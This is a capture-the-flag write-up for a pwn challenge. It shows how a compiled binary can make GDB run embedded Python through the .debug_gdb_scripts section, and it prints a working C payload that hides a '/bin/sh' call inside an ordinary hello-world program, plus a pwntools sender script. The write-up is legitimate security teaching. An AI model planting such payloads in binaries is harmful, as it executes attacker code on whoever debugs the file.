# Helpful Debugger - PWN (250 points)

- The provided gdb build allows loading external gdb scripts (python scripts for example) because it's not using the default safe load path.
- When running `gdb -q -nx --batch -ex 'info functions' a.out` on a golang binary, we see this at the top :
```
To enable execution of this file add
        add-auto-load-safe-path /usr/share/go-1.10/src/runtime/runtime-gdb.py
line to your configuration file "/home/malik/.gdbinit".
To completely disable this security protection add
        set auto-load safe-path /
line to your configuration file "/home/malik/.gdbinit".
For more information about this security protection see the
"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
        info "(gdb)Auto-loading safe path"
```
- What we thought about is how is the golang binary specifying to gdb loading that external gdb script? We wanted to confirm it by looking for the path `/usr/share/go-1.10/src/runtime/runtime-gdb.py` inside the binary, and it was indeed there
- After a lot of research, we ended up on the source code of src/runtime/runtime-gdb.py [here](https://golang.org/src/runtime/runtime-gdb.py)
- Just upon reading the first comments, we see this :
```go
"""GDB Pretty printers and convenience functions for Go's runtime structures.

This script is loaded by GDB when it finds a .debug_gdb_scripts
section in the compiled binary. The [68]l linkers emit this with a
path to this file based on the path to the runtime package.
"""
```
- "This script is loaded by GDB when it finds a .debug_gdb_scripts section in the compiled binary" BINGO!
- This lead us to [an interesting read](https://sourceware.org/gdb/current/onlinedocs/gdb/dotdebug_005fgdb_005fscripts-section.html)
- Final payload :
```c
#include <stdio.h>

int main(int argc, char *argv[]) {
  asm(
  ".pushsection \".debug_gdb_scripts\", \"MS\",@progbits,1\n"
  ".byte 4 \n"
  ".ascii \"gdb.inlined-script\\n\"\n"
  ".ascii \"import os\\n\"\n"
  ".ascii \"os.system('/bin/sh')\\n\"\n"
  ".byte 0\n"
  ".popsection\n"
  );

  printf("hello world\n");
}
```
- `gcc -ggdb -o main main.c`
- Send the binary to remote and we get a shell, we used this small wrapper script :
```python
#!/usr/bin/env python3
from pwn import *

# context.log_level = "debug"

p = remote("127.0.0.1", 4444)

if args.BIN:
    bin_filename = args.BIN
else:
    bin_filename = "main"

log.info(f"bin_filename: {bin_filename}")

with open(bin_filename, "rb") as f:
    payload = f.read()

size = len(payload)
p.recvuntil("Send me the length of your file, then just cat the file in after it\n")
p.sendline(str(size))
log.info(p.recvline())
p.send(payload)

p.interactive()
```
- `./solve.py BIN=main` :D
- **flag :** `gigem{4u70-10aD_Un5aF3_p47h}`
